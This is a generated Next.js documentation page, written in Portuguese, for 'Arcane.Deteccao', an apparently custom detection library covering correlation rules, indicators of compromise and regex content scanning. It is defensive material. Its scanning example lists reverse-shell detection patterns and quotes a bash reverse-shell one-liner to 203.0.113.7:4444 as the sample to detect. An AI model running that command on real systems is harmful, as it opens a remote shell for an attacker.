// GERADO por 'tools/gerar_paginas_biblioteca.py'. Nao edite aqui.
// O que e escrito a mao mora em
// 'site/scripts/conteudo_biblioteca/deteccao.py'; as tabelas saem do
// proprio modulo, a cada geracao.

import type { Metadata } from 'next';
import type { Bloco } from '@/lib/content';
import { DocPage } from '@/components/Doc';
import { Renderer } from '@/components/Renderer';

export const metadata: Metadata = {
  title: "Arcane.Deteccao",
  description: "Regras de detecção sobre eventos, com correlação por chave em janela deslizante, supressão, gravidade e mapa para MITRE ATT&CK; indicadores de comprometimento com prazo e normalização; padrões sobre conteúdo e leitura de log de acesso. O alerta carrega os eventos que o causaram.",
};

const blocos: Bloco[] = [
  {"p": "Gravar log é fácil e quase inútil sozinho: ninguém lê dez milhões de linhas. O que transforma log em defesa é a **regra** — a afirmação de que uma sequência de eventos significa alguma coisa — e o **alerta**, que é a regra disparando com o contexto junto."},
  {"p": "Este módulo é a peça entre [`Seguranca.auditoria`](/docs/biblioteca/seguranca) (que grava) e a pessoa (que precisa saber). Ele é pequeno de propósito: um SIEM de verdade é infraestrutura, e reimplementá-lo em Python daria um subconjunto pior amarrado à linguagem."},
  { code: `adopt Arcane.Deteccao as D

m := D.motor()
m.regra("forca-bruta", quando := "login.falhou", vezes := 5,
    janela := 60.0, gravidade := "alto", attack := "T1110",
    por := "ip", descricao := "cinco falhas na mesma origem")

cycle i from 1 to 4:
    assert len(m.evento("login.falhou", {"ip": "203.0.113.7"})) is 0

novos := m.evento("login.falhou", {"ip": "203.0.113.7"})
assert len(novos) is 1

a := novos[0]
out $"{a['gravidade']} — {a['regra']} ({a['attack']})"
out $"causado por {len(a['eventos'])} eventos"`, title: `uma regra` },
  {"h2": "As cinco decisões"},
  {"table": {"head": ["Decisão", "Sem ela"], "rows": [
      ["a correlação é por **chave**", "cinco falhas de cinco pessoas diferentes viram um alerta de força bruta — e o alerta que mais custa é o que está errado"],
      ["a janela é **deslizante**", "5 falhas às 23h59 e 5 às 00h01 passam por baixo de duas janelas fixas, e é assim que se contorna um contador por minuto"],
      ["o alerta traz os **eventos que o causaram**", "“força bruta detectada” sem o que aconteceu não é investigável"],
      ["há **supressão**", "a mesma regra disparando mil vezes por minuto é ruído, e ruído é o que faz desligar o alerta"],
      ["a regra que **falha** é contada", "um motor que morre no primeiro erro de regra deixa de detectar tudo o resto — e o silêncio parece calmaria"]
    ]}},
  { code: `adopt Arcane.Deteccao as D

// Cinco falhas de CINCO origens diferentes nao sao forca bruta.
m := D.motor()
m.regra("fb", quando := "login.falhou", vezes := 5, janela := 60.0,
    por := "ip")

cycle ip in ["1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4", "5.5.5.5"]:
    m.evento("login.falhou", {"ip": ip})

assert len(m.alertas()) is 0`, title: `correlação por chave` },
  {"h2": "Indicadores"},
  {"p": "Um IOC — hash, IP, domínio, URL — responde *“isto já foi visto num incidente?”*. Ele é **datado e perecível**: um IP malicioso hoje é um IP de nuvem reciclado em três semanas, e um indicador sem prazo vira falso positivo permanente."},
  { code: `adopt Arcane.Deteccao as D

m := D.motor()
ind := m.indicadores()

ind.acrescentar("ip", "198.51.100.66", fonte := "feed-x",
    gravidade := "critico")
ind.acrescentar("dominio", "MAU.EXEMPLO.")

// O mesmo indicador escrito de dois jeitos e o mesmo indicador.
assert ind.ver("dominio", "mau.exemplo") isnt void
assert ind.ver("ip", "8.8.8.8") is void

// 'observar' liga o indicador ao motor: bateu, virou evento.
m.regra("ioc", quando := "indicador.visto", vezes := 1,
    gravidade := "critico")
m.observar("ip", "198.51.100.66", {"onde": "proxy"})

assert len(m.alertas(gravidade_minima := "critico")) is 1`, title: `IOC` },
  {"callout": {"tipo": "atencao", "titulo": "Um IOC não prova nada sozinho", "texto": "Um domínio na lista pode ser um colega abrindo um artigo sobre o incidente. IOC é **sinal**, e o valor dele está em somar com outros — é por isso que `observar` produz um *evento*, que entra nas regras, em vez de um veredito."}},
  {"h2": "Padrões sobre conteúdo"},
  { code: `adopt Arcane.Deteccao as D

regras := [
    D.padrao("shell-reverso", ["bash -i", "/dev/tcp/", "nc -e"],
        gravidade := "critico"),
    D.padrao("base64-longo", ["[A-Za-z0-9+/]{120,}={0,2}"],
        gravidade := "medio")
]

suspeito := """#!/bin/sh
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
"""

achados := D.varrer(suspeito, regras)
cycle r in achados:
    out $"{r['gravidade']} — {r['regra']} ({r['total']})"
    cycle x in r["achados"]:
        out $"   linha {x['linha']}: {x['padrao']}"`, title: `varrer` },
  {"callout": {"tipo": "atencao", "titulo": "Isto não é YARA", "texto": "`varrer` casa expressão regular sobre texto e bytes, o que cobre a parte de YARA que se usa no dia a dia (as strings e a condição). Não há módulo PE, nem operadores de *offset*, nem compilação. Chamá-lo de YARA seria prometer o que não está aqui."}},
  {"h2": "O que ele não faz"},
  {"table": {"head": ["Não faz", "Porque"], "rows": [
      ["não **envia** alerta", "`ao_alertar` recebe um retorno de chamada, e quem manda para o Slack, o e-mail ou o Telegram é quem chama. Um módulo que escolhesse o canal escolheria errado — e traria uma dependência de rede para o caminho de uma detecção"],
      ["não lê arquivo de log sozinho", "ele recebe eventos. Um leitor embutido teria de adivinhar o formato, e formato de log é a coisa que menos se parece entre dois sistemas. `ler_linha` cobre só o combinado (Apache/nginx), e diz isso"]
    ]}},
  {"p": "Guia com contexto: [As ferramentas](/docs/seguranca/ferramentas) e [Ataques a credenciais](/docs/seguranca/ataques)."},
  {"h2": "Constantes"},
  {"table": {"head": ["Nome", "Valor"], "rows": [["`GRAVIDADES`", "`[\"informativo\", \"baixo\", \"medio\", \"alto\", \"critico\"]`"], ["`TIPOS_DE_INDICADOR`", "`[\"ip\", \"dominio\", \"url\", \"hash\", \"email\", \"usuario\"]`"]]}},
  {"h2": "Funções (5)"},
  {"table": {"head": ["Assinatura"], "rows": [["`indicadores()`"], ["`ler_linha(linha, formato='combinado')`"], ["`motor()`"], ["`padrao(nome, textos, gravidade='medio', descricao='')`"], ["`varrer(conteudo, padroes, minimo=1)`"]]}},
];

const headings = [{ id: 'as-cinco-decisoes', text: "As cinco decisões", level: 2 as const }, { id: 'indicadores', text: "Indicadores", level: 2 as const }, { id: 'padroes-sobre-conteudo', text: "Padrões sobre conteúdo", level: 2 as const }, { id: 'o-que-ele-nao-faz', text: "O que ele não faz", level: 2 as const }, { id: 'constantes', text: "Constantes", level: 2 as const }, { id: 'funcoes-5', text: "Funções (5)", level: 2 as const }];

export default function Pagina() {
  return (
    <DocPage
      title={"Arcane.Deteccao"}
      description={"Regras de detecção sobre eventos, com correlação por chave em janela deslizante, supressão, gravidade e mapa para MITRE ATT&CK; indicadores de comprometimento com prazo e normalização; padrões sobre conteúdo e leitura de log de acesso. O alerta carrega os eventos que o causaram."}
      href={"/docs/biblioteca/deteccao"}
      headings={headings}
    >
      <Renderer blocos={blocos} />
    </DocPage>
  );
}
